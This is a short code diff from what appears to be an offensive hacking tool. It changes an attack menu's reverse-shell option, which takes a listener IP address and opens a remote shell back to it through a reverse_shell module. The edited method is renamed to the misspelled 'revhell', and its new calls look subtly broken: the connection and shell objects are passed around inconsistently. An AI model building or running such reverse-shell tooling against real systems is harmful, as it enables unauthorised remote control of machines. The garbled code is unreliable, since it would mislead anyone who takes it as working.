@@ -83,14 +83,14 @@ class AttackController:
     def exploit_menu(self):
         pass
 
-    def reverseshell(self):
+    def revhell(self):
+
         listener_ip_address = input("[*] IP OF LISTENING HOST: ")
 
-        rev = reverse_shell().ReverseShell()
-        target_connection = rev.connect(listener_ip_address)
+        rev = reverse_shell().connect(listener_ip_address)
+        target_connection = reverse_shell().shell(rev)
 
         rev.shell(target_connection)
-
 
     def categories(self):
 
@@ -115,7 +115,7 @@ class AttackController:
         if input_section == "3":
             pass
         if input_section == "4":
-            AttackController().reverseshell()
+            AttackController().revhell()
 
 def main():
 
